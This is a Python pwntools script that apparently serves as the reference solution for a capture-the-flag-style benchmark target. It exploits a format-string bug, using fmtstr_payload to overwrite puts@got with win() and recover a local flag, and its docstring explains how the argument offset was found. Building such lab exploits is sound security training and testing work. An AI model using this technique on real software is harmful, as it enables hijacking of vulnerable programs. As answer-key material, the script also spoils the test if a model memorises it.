#!/usr/bin/env python3
"""Hand-verified reference exploit for corpus_r2/12_fmtstr_got_overwrite.

Technique: `printf(buf)` on attacker-controlled `buf` is a direct format-
string vulnerability with no read/write primitive limits. Rather than a
single 2-byte %hn write (round-2 target 06) or a read-only leak (target
05), this overwrites the FULL 8 bytes of `puts@got` via pwntools'
`fmtstr_payload` multi-%hn write helper, redirecting a call the program
already makes (`puts("post-leak checkpoint")`, later in the same vuln()
invocation) into win().

Argument-index discovery: a probe of "MARKERAA" + "%N$p" for N=1..30
against a fresh run shows argument index 6 decodes to exactly the 8 marker
bytes ("MARKERAA" as a little-endian u64) -- i.e. `buf`'s own first 8 bytes
are readable as the 6th variadic argument to printf(buf). That's the
`offset` pwntools' fmtstr_payload needs (it embeds the target addresses at
the START of the format-string buffer and writes %N$hn specifiers assuming
argument N corresponds to those embedded addresses).

win() itself uses raw write()/open() (not puts()) specifically so the
hijacked puts@got entry cannot recursively call itself when win() needs to
print the flag.

Reached via a genuine `call puts@plt` (the PLT stub does `jmp *puts@got`,
so the call/return-address bookkeeping is unaffected) -- not a ret-based
hijack -- so no ABI stack-alignment fixup is required, unlike several
other targets in this corpus.
"""
import os
import sys

from pwn import ELF, context, fmtstr_payload, process

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "corpus_r2", "12_fmtstr_got_overwrite",
                    "fmtstr_got_overwrite")

context.log_level = "error"
context.arch = "amd64"

FMT_ARG_OFFSET = 6  # buf[0:8] == the 6th printf variadic argument (see docstring)


def main():
    elf = ELF(BIN, checksec=False)
    win_addr = elf.symbols["win"]
    puts_got = elf.got["puts"]

    io = process(BIN, cwd=os.path.dirname(BIN))
    io.recvuntil(b"msg: ")

    payload = fmtstr_payload(FMT_ARG_OFFSET, {puts_got: win_addr}, write_size="short")
    io.sendline(payload)

    out = io.recvall(timeout=3).decode(errors="replace")
    io.close()

    flag_file = os.path.join(HERE, "..", "corpus_r2", "12_fmtstr_got_overwrite",
                              "flag.txt")
    with open(flag_file) as f:
        expected = f.read().strip()

    if expected in out:
        print(f"[+] PASS: flag recovered: {expected}")
        return 0
    print("[-] FAIL: flag not found in output")
    print(out)
    return 1


if __name__ == "__main__":
    sys.exit(main())
